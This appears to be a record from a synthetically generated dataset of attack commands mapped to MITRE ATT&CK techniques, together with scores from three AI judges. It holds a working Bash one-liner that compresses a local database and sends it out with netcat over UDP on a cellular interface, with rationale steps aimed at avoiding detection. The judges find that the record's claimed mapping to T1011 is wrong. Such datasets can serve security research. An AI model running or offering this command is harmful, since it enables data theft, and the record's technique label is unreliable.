@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
+  "explanation": "Compresses and exfiltrates data over the cellular interface (wwan0) using UDP on a high port, with tcpdump monitoring only that flow. This is exfiltration over a non-primary medium per T1011.",
+  "rationale_steps": [
+    "Route via cellular (wwan0) to separate from the main enterprise network.",
+    "Pick uncommon UDP port 56107 to lower detection likelihood.",
+    "Monitor narrowly with tcpdump and discard output.",
+    "Pipe compressed data into nc bound to the wwan0 IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-f0489bd2",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed compound command with proper backgrounding, piping, and redirections, and commonly valid flags for tcpdump, gzip, and nc.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly compresses and exfiltrates data over UDP (likely via the cellular interface) and backgrounds tcpdump, it does not perform exfiltration over a physical medium as described for T1011 and tcpdump may fail without elevated privileges.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:46:23.123417Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators, valid flags for all tools used (tcpdump, gzip, nc), balanced quoting, and correct background process handling with nohup.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command does exfiltrate data, it misaligns with T1011 (Exfiltration Over Physical Medium) as it uses network-based exfiltration over UDP rather than transferring data to a physical device like USB drives or SD cards.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:46:26.435957Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, arguments, redirects, and command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs network exfiltration, which fundamentally contradicts the definition of MITRE ATT&CK T1011 (Exfiltration Over Physical Medium), and it claims 'Privilege: None' despite `tcpdump -i` and `nc -s` typically requiring elevated privileges.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:46:47.139357Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
